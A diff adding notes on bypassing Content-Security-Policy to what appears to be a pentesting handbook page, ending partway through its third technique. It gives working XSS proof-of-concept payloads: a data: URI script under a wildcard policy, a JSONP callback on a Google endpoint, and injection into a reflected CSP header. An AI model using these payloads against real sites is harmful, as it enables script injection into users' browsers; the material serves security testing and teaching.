@@ -30,3 +30,41 @@ Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'sel
 
 ### <mark style="color:yellow;">Ways to bypass CSP</mark>
 
+💡[LOOK HERE](https://www.cobalt.io/blog/csp-and-bypasses)&#x20;
+
+#### 1. Basic CSP Bypass
+
+💡Always look out for wildcard permissions.
+
+CSP header:
+
+* Content-Security-Policy: script-src 'self' https://cobalt.io https: data \*;
+
+XSS payload:
+
+* \<script src="data:text/javascript,alert(document.domain)">\</script>
+
+#### 2. JSONP CSP Bypass
+
+JSONP is a way to bypass the same object policy (SOP).
+
+A JSONP endpoint lets you insert a javascript payload, normally in a GET parameter called “callback” allowing it to bypass the SOP.
+
+CSP header:
+
+* script-src https://www.google.com [https://accounts.google.com](https://accounts.google.com/);
+
+XSS payload:
+
+* test.com?vuln\_param=https://accounts.google.com/o/oauth2/revoke<mark style="color:green;">?callback=alert(1)</mark>
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>alert function being displayed on the page</p></figcaption></figure>
+
+#### 3. CSP Injection Bypass
+
+If our input is reflected in the CSP header, we can control what value the script-src value is set to by setting it to a domain we control.
+
+CSP header:
+
+* script-src <mark style="color:green;">payload</mark>;
+
